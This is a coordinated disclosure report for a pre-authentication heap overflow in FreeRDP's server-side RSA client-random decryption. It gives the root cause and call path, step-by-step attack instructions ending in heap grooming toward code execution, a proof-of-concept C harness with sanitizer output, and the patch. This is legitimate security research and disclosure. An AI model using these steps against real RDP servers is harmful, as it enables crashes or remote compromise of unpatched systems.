<!-- source: https://red.anthropic.com/2026/cvd/findings/ANT-2026-K9VH6KBR -->

# ANT-2026-K9VH6KBR · freerdp/freerdp

## heap-buffer-overflow high

[CVE-2026-64620](https://nvd.nist.gov/vuln/detail/CVE-2026-64620)
[GHSA-pjqx-v446-x7fc](https://github.com/FreeRDP/FreeRDP/security/advisories/GHSA-pjqx-v446-x7fc)

Maintainer -

Anthropic's analysis, sealed at approval. Disclosure to the maintainer was performed by Ada Logics.

# ANT-2026-K9VH6KBR: Pre-auth server heap overflow decrypting client random

In libfreerdp/crypto/crypto.c:106, BN\_bn2bin(y, output) writes up to the RSA modulus length (64–256 bytes) into the caller's buffer and only checks the size afterward. The caller rdp\_update\_client\_random() (connection.c:876-882) passes a fixed 32-byte ClientRandom heap buffer as the output for decrypting the attacker-supplied encrypted client random. Because the server's RSA public key is sent to the client, the attacker can craft ciphertext X = Y^e mod n so the decrypted Y fills the full modulus length, overflowing the 32-byte buffer by 32–224 attacker-controlled bytes. The path is reachable pre-authentication whenever RDP Standard Security is negotiated, which the client can unilaterally force and which is enabled by default in FreeRDP's shadow server, sample server, and proxy.

**Project:** freerdp/freerdp
**Location:** `libfreerdp/crypto/crypto.c:106`

The root cause is a write-then-check ordering bug: BN\_bn2bin(y, output) unconditionally writes BN\_num\_bytes(y) bytes into the output buffer, and the comparison against out\_length at line 109 happens only after the write has already occurred. Since rdp\_update\_client\_random() allocates ClientRandom as a fixed calloc(32,1) buffer while the decrypted value can be as large as the RSA modulus (64 bytes for the built-in tssk key, 256 for RSA-2048), an attacker who controls the ciphertext controls both the length and content of a 32–224 byte heap overwrite.

1. Connect and advertise only PROTOCOL\_RDP in the X.224 Connection Request, forcing the server to select RDP Standard Security (connection.c:1487).
2. Receive the server's Proprietary Server Certificate containing the RSA public key (n, e) in the MCS Connect Response.
3. Choose a plaintext Y < n with the top byte set so BN\_num\_bytes(Y) equals the full modulus length; compute X = Y^e mod n.
4. Send X padded to ModulusLength+8 bytes as the encrypted client random in the Security Exchange PDU.
5. Server path rdp\_server\_establish\_keys() → rdp\_update\_client\_random() → crypto\_rsa\_private\_decrypt() → crypto\_rsa\_common() calls BN\_bn2bin(y, output), writing 64–256 attacker-chosen bytes into the 32-byte ClientRandom heap buffer.
6. Repeat with heap grooming across connections to corrupt adjacent allocator metadata/objects and achieve code execution.

## Suggested Fix

Validate BN\_num\_bytes(y) against out\_length before calling BN\_bn2bin, or decrypt into a modulus-sized scratch buffer and copy only out\_length bytes into the caller's buffer.

This vulnerability was discovered by Claude, Anthropic's AI assistant, and triaged by the Anthropic security team in collaboration with Anthropic Research. Please direct questions to security-cvd@anthropic.com and reference ANT-2026-K9VH6KBR.

---

**Reference:** ANT-2026-K9VH6KBR

Triage and disclosure were performed by Ada Logics. The writeup below is the document the firm sent to the maintainer.

## Summary

FreeRDP's RSA helper `crypto_rsa_common()`
(`libfreerdp/crypto/crypto.c`) serialises the modular-exponentiation result into
the caller's output buffer with `output_length = BN_bn2bin(y, output)` **and only
then** checks `output_length > out_length`. `BN_bn2bin` writes `BN_num_bytes(y)`
bytes unconditionally, so the bounds check at `crypto.c:109` runs one statement
**after** the out-of-bounds bytes are already on the heap.

On the **server** side this is reachable **pre-authentication**. When a client
selects RDP Standard Security, `rdp_server_establish_keys()` →
`rdp_update_client_random()` decrypts the client-supplied *encrypted client
random* into a hard-coded **32-byte** `ClientRandom` buffer
(`connection.c:885` / `:904`, `out_length = 32`). The server publishes its RSA
public key `(n,e)` in the Proprietary Server Certificate, so an unauthenticated
attacker can forge a ciphertext `X = Y^e mod n` whose decryption `Y` is up to the
full modulus length (256 bytes for RSA-2048). `BN_bn2bin` then writes that value
into the 32-byte buffer, overflowing the heap by up to **~224 fully
attacker-controlled bytes** before any authentication.

## Severity

**High** — CWE-787 (Out-of-bounds Write) via CWE-697 (comparison performed after
the write instead of before). Pre-authentication, no user interaction,
network-reachable on FreeRDP-based servers that permit RDP Standard Security
(sample `sfreerdp-server`, `freerdp-shadow-cli`, proxy). The attacker controls
the overflow **length and content**, and the write is repeatable across
reconnects (heap grooming). High rather than Critical because control-flow
hijack is not demonstrated here.

## Affected versions

* **FreeRDP 3.x** — present in the latest release tag **3.27.1** and on `master`
  (HEAD `1f7a716d39b5605bb8a83b0c3c97a6ce386609ef`, reproduced 2026-07-01). In
  both, `BN_bn2bin(y, output)` is at `libfreerdp/crypto/crypto.c:106` and the
  `> out_length` check at `:109`; the 32-byte caller buffer is fixed at
  `libfreerdp/core/connection.c:885`. Unpatched. Because the bug is in a released
  3.x tag (not development-branch-only), it qualifies for a CVE under the
  project's supported-versions policy.
* No special build flags required. The overflow occurs for any RSA key with a
  modulus larger than 32 bytes — i.e. always (the built-in test key is 2048-bit;
  real keys are ≥512-bit).

### Relationship to CVE-2020-13398

This is the **same function** as CVE-2020-13398 / GHSL-2020-102, but a distinct,
still-live defect. That 2020 issue concerned the **input** buffer handling; at
the time the function had no `out_length` parameter at all. The `out_length`
parameter and the `output_length > out_length` check were added later — but
placed **after** the `BN_bn2bin` write, so the output-buffer overflow remains
reachable. We did not find any advisory describing this write-then-check ordering
on the output buffer; it appears unpublished. (Nearby but unrelated: CVE-2026-33982
winpr realloc OOB read; GHSA-8jm9-2925-g4v2 persistent cache.)

## Details

### Vulnerable code

`libfreerdp/crypto/crypto.c`, `crypto_rsa_common()`:

```
    if (BN_mod_exp(y, x, exp, mod, ctx) != 1)                       // :104  y = x^d mod n (attacker-chosen)
        goto fail;
    output_length = BN_bn2bin(y, output);                          // :106  writes BN_num_bytes(y) bytes into `output` NOW
    if (output_length < 0)
        goto fail;
    if (WINPR_ASSERTING_INT_CAST(size_t, output_length) > out_length) // :109  bounds check — AFTER the write
        goto fail;
    crypto_reverse(output, WINPR_ASSERTING_INT_CAST(size_t, output_length));
```

`output` / `out_length` are the caller's buffer and its capacity. `BN_bn2bin(y,
output)` serialises the bignum `y` into `output`, writing exactly
`BN_num_bytes(y)` bytes — anywhere from 1 up to the RSA modulus length. That count
is compared to `out_length` only at `:109`, one statement too late. There is no
scratch buffer and no pre-write check.

### Attacker control over `BN_num_bytes(y)`

`y = x^d mod n`, where `x` is the attacker's ciphertext and `d`/`n` are the
server's private exponent / modulus. The attacker does not know `d`, but the
server publishes `(n,e)` in its Proprietary Server Certificate. So the attacker
chooses an arbitrary plaintext `Y` (e.g. a full-modulus-width value) and sends
`X = Y^e mod n`; the server's decryption recovers exactly `Y`. The attacker thus
controls **both the length and the content** of the overflow.

### The caller supplies a fixed 32-byte buffer

`libfreerdp/core/connection.c`, `rdp_update_client_random()`:

```
    const size_t length = 32;                                       // :885  hard-coded, independent of key size
    ...
    if (crypt_random_len != cinfo->ModulusLength + 8)               // :894  attacker sets the wire length field
        return FALSE;
    if (!freerdp_settings_set_pointer_len(settings, FreeRDP_ClientRandom, nullptr, length)) // :899  alloc 32 bytes
        return FALSE;
    BYTE* client_random = freerdp_settings_get_pointer_writable(settings, FreeRDP_ClientRandom); // :902
    return crypto_rsa_private_decrypt(crypt_random, crypt_random_len - 8, rsa,
                                      client_random, length);        // :904  out_length = 32
```

### Root cause

`BN_num_bytes(y)` is never compared against `out_length` *before* `BN_bn2bin`
writes into `output`. The existing `> out_length` check executes only after the
overflow has occurred.

### Server-side, pre-authentication call path

```
peer_recv_pdu (server state machine)
  rdp_server_establish_keys(rdp, s)                       libfreerdp/core/peer.c:913
    (if settings->UseRdpSecurityLayer)                    libfreerdp/core/connection.c:918
    ... read Security Exchange PDU, rand_len ...          connection.c:908+
    rdp_update_client_random(settings, crypt_random, rand_len)   connection.c:953
      crypto_rsa_private_decrypt(crypt_random, ModulusLength, rsa, client_random /*32B*/, 32)  connection.c:904
        crypto_rsa_private -> crypto_rsa_common(..., output=client_random, out_length=32)      crypto.c:148
          BN_bn2bin(y, output)                            crypto.c:106   <-- OVERFLOW (up to ModulusLength bytes)
```

`UseRdpSecurityLayer` is enabled by the server's negotiation code when the client
advertises / falls back to `PROTOCOL_RDP` in the X.224 Connection Request — a
choice the client makes unilaterally, pre-authentication.

## Impact

An unauthenticated network attacker who connects to a FreeRDP-based server that
permits RDP Standard Security can trigger a heap out-of-bounds write of up to
~224 bytes, with attacker-controlled length and content, during key
establishment — before any credential check. This corrupts adjacent heap
allocations / allocator metadata; because the content and length are controlled
and the write is repeatable across reconnects (enabling grooming), it is a strong
corruption primitive and a credible path toward remote code execution, though
control-flow hijack is not demonstrated here. Guaranteed impact is at minimum a
remote pre-auth server crash (DoS). → **High**.

Server-side install base is smaller than client-side, but FreeRDP-derived servers
(shadow, proxy, embedded appliances) are exposed on the public internet.
Workaround until patched: require TLS/NLA (`PROTOCOL_SSL` / `PROTOCOL_HYBRID`) and
disable RDP Standard Security so `UseRdpSecurityLayer` is never set and
`rdp_server_establish_keys` returns early.

## Proof of Concept

Self-contained Docker reproducer. Because the overflowing store happens inside
libcrypto's `BN_bn2bin`, it builds **OpenSSL from source under AddressSanitizer**
(the distro libcrypto is not instrumented and would hide the write), plus FreeRDP
static libs under ASan at the affected commit. The harness drives the **real
upstream `crypto_rsa_private_decrypt`** with exactly the arguments the server
passes from `rdp_update_client_random()` (`out_length = 32`, ciphertext forged
with FreeRDP's own `crypto_rsa_public_encrypt` so the bytes are wire-faithful).

Standing up a full malicious RDP handshake (X.224 → MCS/GCC → parse the server
cert → forge the Security Exchange PDU) was out of proportion to the harness
budget; the pre-auth reachability is established by the shipped server state
machine above (`peer.c:913` → `connection.c:953` → `:904`) and is not in doubt —
only not exercised end-to-end in-container.

**`harness.c`** (essential logic)

```
/* Reproduces the primitive rdp_update_client_random() drives pre-auth:
 * decrypt an attacker ciphertext into a fixed 32-byte buffer. */
#include <freerdp/crypto/crypto.h>
#include <freerdp/crypto/privatekey.h>

extern const rdpCertInfo* freerdp_key_get_info(const rdpPrivateKey* key);
extern SSIZE_T crypto_rsa_public_encrypt(const BYTE*, size_t, const rdpCertInfo*, BYTE*, size_t);
extern SSIZE_T crypto_rsa_private_decrypt(const BYTE*, size_t, const rdpPrivateKey*, BYTE*, size_t);

int main(int argc, char** argv)
    rdpPrivateKey* key = freerdp_key_new_from_file(argc > 1 ? argv[1] : "/tmp/key.pem");
    const rdpCertInfo* info = freerdp_key_get_info(key);
    const size_t ML = info->ModulusLength;              /* 256 for RSA-2048 */

    /* Plaintext Y occupying >32 bytes; first OOB store lands on the 32-byte
     * buffer's ASan redzone. (Filling all ML bytes reproduces the full ~224B
     * overwrite.) */
    BYTE* Y = calloc(ML, 1);
    for (size_t i = 0; i < 33; i++) Y[i] = 0xAB;

    /* Forge the wire ciphertext X = Y^e mod n with FreeRDP's own public-key op. */
    BYTE* X = malloc(ML);
    crypto_rsa_public_encrypt(Y, ML, info, X, ML);

    BYTE* client_random = malloc(32);                  /* == the ClientRandom buffer */

    /* out_length = 32, exactly as rdp_update_client_random() passes it. */
    crypto_rsa_private_decrypt(X, ML, key, client_random, 32);   /* BN_bn2bin writes ML bytes -> overflow */
    return 0;
```

**`Dockerfile`** (outline)

```
FROM ubuntu:24.04
ENV DEBIAN_FRONTEND=noninteractive
ARG TARGET_COMMIT=1f7a716d39b5605bb8a83b0c3c97a6ce386609ef
ARG OPENSSL_TAG=openssl-3.0.13
ARG CLANG_VERSION=20
# clang-20 from apt.llvm.org; ASAN flags: -g -fno-omit-frame-pointer -O1 -fsanitize=address

# 1) OpenSSL from source, static, with ASan (so BN_bn2bin is instrumented)
RUN git clone --branch ${OPENSSL_TAG} --depth 1 https://github.com/openssl/openssl /src/openssl
#   ./Configure ... -fsanitize=address && make

# 2) FreeRDP static libs with ASan at the affected commit
RUN git clone https://github.com/freerdp/freerdp /src/repo && cd /src/repo && git checkout ${TARGET_COMMIT}
#   cmake -DBUILD_SHARED_LIBS=OFF ... link against the ASan OpenSSL

# 3) generate an RSA-2048 server key, build harness.c, run it
CMD ["/bin/sh","-c","/tmp/poc_run /tmp/key.pem 2>&1; echo EXIT=$?"]
```

(The full, runnable `Dockerfile`, `Dockerfile.fix`, and `harness.c` accompany
this report.)

**Observed output at master `1f7a716d` (AddressSanitizer):**

```
[*] RSA ModulusLength = 256 bytes
[*] crypto_rsa_public_encrypt -> 256
[*] calling crypto_rsa_private_decrypt(input=256 bytes, out_buf=32) ...
==7==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x7b4d0b208410 ...
WRITE of size 1 at 0x7b4d0b208410 thread T0
    #0 ... in bn2binpad /src/openssl/crypto/bn/bn_lib.c:523:19
    #1 ... in BN_bn2bin /src/openssl/crypto/bn/bn_lib.c:541:12
    #2 ... in crypto_rsa_common /src/repo/libfreerdp/crypto/crypto.c:106:18
    #3 ... in crypto_rsa_private /src/repo/libfreerdp/crypto/crypto.c:148:9
    #4 ... in main /tmp/harness.c
0x7b4d0b208410 is located 0 bytes after 32-byte region [0x7b4d0b2083f0,0x7b4d0b208410)   <-- the 32-byte ClientRandom analogue
SUMMARY: AddressSanitizer: heap-buffer-overflow /src/openssl/crypto/bn/bn_lib.c:523:19 in bn2binpad
==7==ABORTING
EXIT=134
```

## Suggested fix

Bound `BN_num_bytes(y)` against `out_length` **before** the write:

```
     if (BN_mod_exp(y, x, exp, mod, ctx) != 1)
         goto fail;
+    /* BN_bn2bin writes BN_num_bytes(y) bytes unconditionally; bound it BEFORE the write. */
+    if ((size_t)BN_num_bytes(y) > out_length)
+        goto fail;
     output_length = BN_bn2bin(y, output);
     if (output_length < 0)
         goto fail;
-    if (WINPR_ASSERTING_INT_CAST(size_t, output_length) > out_length)
-        goto fail;
```

Equivalently, `BN_bn2bin` into a modulus-sized scratch buffer and `memcpy` at
most `out_length` bytes into the caller's buffer. **Fix-verified:** with the
pre-write guard the same PoC returns `-1` with no ASan report and `EXIT=0`.

## References

* `libfreerdp/crypto/crypto.c:106` (`crypto_rsa_common`, `BN_bn2bin` before the
  `:109` bounds check); `crypto_rsa_private` (:148); `crypto_rsa_private_decrypt` (:170).
* `libfreerdp/core/connection.c:885` (`length = 32`), `:894/:899/:902/:904`
  (`rdp_update_client_random`), `:908/:918/:953` (`rdp_server_establish_keys`);
  `libfreerdp/core/peer.c:913` (server entry).
* CVE-2020-13398 / GHSL-2020-102 (same function, distinct input-side issue):
  https://securitylab.github.com/advisories/GHSL-2020-102-FreeRDP/
* CWE-787 (Out-of-bounds Write), CWE-697 (Incorrect Comparison).

## Attribution

please credit **Claude** and **Ada Logics** — found by Anthropic using agents
to study the security of open-source projects, with Ada Logics validating and reporting.

## Disclosure

This report follows a 90-day coordinated disclosure timeline as per https://www.anthropic.com/coordinated-vulnerability-disclosure

```
diff --git a/libfreerdp/crypto/crypto.c b/libfreerdp/crypto/crypto.c
index 836f84e9b9dd..63012ae8e5d3 100644
--- a/libfreerdp/crypto/crypto.c
+++ b/libfreerdp/crypto/crypto.c
@@ -103,11 +103,14 @@ static SSIZE_T crypto_rsa_common(const BYTE* input, size_t length, UINT32 key_le
 		goto fail;
 	if (BN_mod_exp(y, x, exp, mod, ctx) != 1)
 		goto fail;
-	output_length = BN_bn2bin(y, output);
+	{
+		const int len = BN_num_bytes(y);
+		if ((len < 0) || (WINPR_ASSERTING_INT_CAST(size_t, len) > out_length))
+			goto fail;
+		output_length = BN_bn2bin(y, output);
+	}
 	if (output_length < 0)
 		goto fail;
-	if (WINPR_ASSERTING_INT_CAST(size_t, output_length) > out_length)
-		goto fail;
 	crypto_reverse(output, WINPR_ASSERTING_INT_CAST(size_t, output_length));

 	if ((size_t)output_length < key_length)
```

<https://github.com/FreeRDP/FreeRDP/commit/27014741a8c22a34d3040c559c82f4ed82841bef>

1. 2026-04-02
2. 2026-07-06
3. 2026-07-22
4. 2026-07-22
5. 2026-09-28

78d201cc43cfb9a7f1429da455c889e2358f1d7ae6f12e7f4f02e255297e156c1d51c18c9de9c0210c001ab248b1b4cf687a10c15765b9f5c8ac46fae8093d8d

Committed 2026-07-22 07:29 UTC

Revealed 2026-09-28 22:00 UTC

[Verify (download preimage.json)](data:application/json;charset=utf-8,%7B%22ant_id%22%3A%22ANT-2026-K9VH6KBR%22%2C%22bug_class%22%3A%22Heap%20Buffer%20Overflow%22%2C%22claude_severity%22%3A%22high%22%2C%22commit_sha%22%3Anull%2C%22created_at%22%3A%222026-04-16T01%3A52%3A43%2B00%3A00%22%2C%22description%22%3A%22In%20libfreerdp/crypto/crypto.c%3A106%2C%20BN_bn2bin%28y%2C%20output%29%20writes%20up%20to%20the%20RSA%20modulus%20length%20%2864%E2%80%93256%20bytes%29%20into%20the%20caller%27s%20buffer%20and%20only%20checks%20the%20size%20afterward.%20The%20caller%20rdp_update_client_random%28%29%20%28connection.c%3A876-882%29%20passes%20a%20fixed%2032-byte%20ClientRandom%20heap%20buffer%20as%20the%20output%20for%20decrypting%20the%20attacker-supplied%20encrypted%20client%20random.%20Because%20the%20server%27s%20RSA%20public%20key%20is%20sent%20to%20the%20client%2C%20the%20attacker%20can%20craft%20ciphertext%20X%20%3D%20Y%5Ee%20mod%20n%20so%20the%20decrypted%20Y%20fills%20the%20full%20modulus%20length%2C%20overflowing%20the%2032-byte%20buffer%20by%2032%E2%80%93224%20attacker-controlled%20bytes.%20The%20path%20is%20reachable%20pre-authentication%20whenever%20RDP%20Standard%20Security%20is%20negotiated%2C%20which%20the%20client%20can%20unilaterally%20force%20and%20which%20is%20enabled%20by%20default%20in%20FreeRDP%27s%20shadow%20server%2C%20sample%20server%2C%20and%20proxy.%22%2C%22discovered_at%22%3A%222026-04-02T00%3A00%3A00%2B00%3A00%22%2C%22location%22%3A%22libfreerdp/crypto/crypto.c%3A106%22%2C%22poc_sha256%22%3Anull%2C%22preimage_version%22%3A1%2C%22project%22%3A%22freerdp/freerdp%22%2C%22reproduction%22%3A%5B%221.%20Connect%20and%20advertise%20only%20PROTOCOL_RDP%20in%20the%20X.224%20Connection%20Request%2C%20forcing%20the%20server%20to%20select%20RDP%20Standard%20Security%20%28connection.c%3A1487%29.%22%2C%222.%20Receive%20the%20server%27s%20Proprietary%20Server%20Certificate%20containing%20the%20RSA%20public%20key%20%28n%2C%20e%29%20in%20the%20MCS%20Connect%20Response.%22%2C%223.%20Choose%20a%20plaintext%20Y%20%3C%20n%20with%20the%20top%20byte%20set%20so%20BN_num_bytes%28Y%29%20equals%20the%20full%20modulus%20length%3B%20compute%20X%20%3D%20Y%5Ee%20mod%20n.%22%2C%224.%20Send%20X%20padded%20to%20ModulusLength%2B8%20bytes%20as%20the%20encrypted%20client%20random%20in%20the%20Security%20Exchange%20PDU.%22%2C%225.%20Server%20path%20rdp_server_establish_keys%28%29%20%E2%86%92%20rdp_update_client_random%28%29%20%E2%86%92%20crypto_rsa_private_decrypt%28%29%20%E2%86%92%20crypto_rsa_common%28%29%20calls%20BN_bn2bin%28y%2C%20output%29%2C%20writing%2064%E2%80%93256%20attacker-chosen%20bytes%20into%20the%2032-byte%20ClientRandom%20heap%20buffer.%22%2C%226.%20Repeat%20with%20heap%20grooming%20across%20connections%20to%20corrupt%20adjacent%20allocator%20metadata/objects%20and%20achieve%20code%20execution.%22%5D%2C%22technical_details%22%3A%22The%20root%20cause%20is%20a%20write-then-check%20ordering%20bug%3A%20BN_bn2bin%28y%2C%20output%29%20unconditionally%20writes%20BN_num_bytes%28y%29%20bytes%20into%20the%20output%20buffer%2C%20and%20the%20comparison%20against%20out_length%20at%20line%20109%20happens%20only%20after%20the%20write%20has%20already%20occurred.%20Since%20rdp_update_client_random%28%29%20allocates%20ClientRandom%20as%20a%20fixed%20calloc%2832%2C1%29%20buffer%20while%20the%20decrypted%20value%20can%20be%20as%20large%20as%20the%20RSA%20modulus%20%2864%20bytes%20for%20the%20built-in%20tssk%20key%2C%20256%20for%20RSA-2048%29%2C%20an%20attacker%20who%20controls%20the%20ciphertext%20controls%20both%20the%20length%20and%20content%20of%20a%2032%E2%80%93224%20byte%20heap%20overwrite.%22%2C%22title%22%3A%22Pre-auth%20server%20heap%20overflow%20decrypting%20client%20random%22%2C%22vendor_severity%22%3A%22high%22%7D)

```
  "ant_id": "ANT-2026-K9VH6KBR",
  "bug_class": "Heap Buffer Overflow",
  "created_at": "2026-04-16T01:52:43+00:00",
  "description": "In libfreerdp/crypto/crypto.c:106, BN_bn2bin(y, output) writes up to the RSA modulus length (64–256 bytes) into the caller's buffer and only checks the size afterward. The caller rdp_update_client_random() (connection.c:876-882) passes a fixed 32-byte ClientRandom heap buffer as the output for decrypting the attacker-supplied encrypted client random. Because the server's RSA public key is sent to the client, the attacker can craft ciphertext X = Y^e mod n so the decrypted Y fills the full modulus length, overflowing the 32-byte buffer by 32–224 attacker-controlled bytes. The path is reachable pre-authentication whenever RDP Standard Security is negotiated, which the client can unilaterally force and which is enabled by default in FreeRDP's shadow server, sample server, and proxy.",
  "discovered_at": "2026-04-02T00:00:00+00:00",
  "location": "libfreerdp/crypto/crypto.c:106",
  "project": "freerdp/freerdp",
    "1. Connect and advertise only PROTOCOL_RDP in the X.224 Connection Request, forcing the server to select RDP Standard Security (connection.c:1487).",
    "2. Receive the server's Proprietary Server Certificate containing the RSA public key (n, e) in the MCS Connect Response.",
    "3. Choose a plaintext Y < n with the top byte set so BN_num_bytes(Y) equals the full modulus length; compute X = Y^e mod n.",
    "4. Send X padded to ModulusLength+8 bytes as the encrypted client random in the Security Exchange PDU.",
    "5. Server path rdp_server_establish_keys() → rdp_update_client_random() → crypto_rsa_private_decrypt() → crypto_rsa_common() calls BN_bn2bin(y, output), writing 64–256 attacker-chosen bytes into the 32-byte ClientRandom heap buffer.",
    "6. Repeat with heap grooming across connections to corrupt adjacent allocator metadata/objects and achieve code execution."
  "technical_details": "The root cause is a write-then-check ordering bug: BN_bn2bin(y, output) unconditionally writes BN_num_bytes(y) bytes into the output buffer, and the comparison against out_length at line 109 happens only after the write has already occurred. Since rdp_update_client_random() allocates ClientRandom as a fixed calloc(32,1) buffer while the decrypted value can be as large as the RSA modulus (64 bytes for the built-in tssk key, 256 for RSA-2048), an attacker who controls the ciphertext controls both the length and content of a 32–224 byte heap overwrite.",
  "title": "Pre-auth server heap overflow decrypting client random",
```
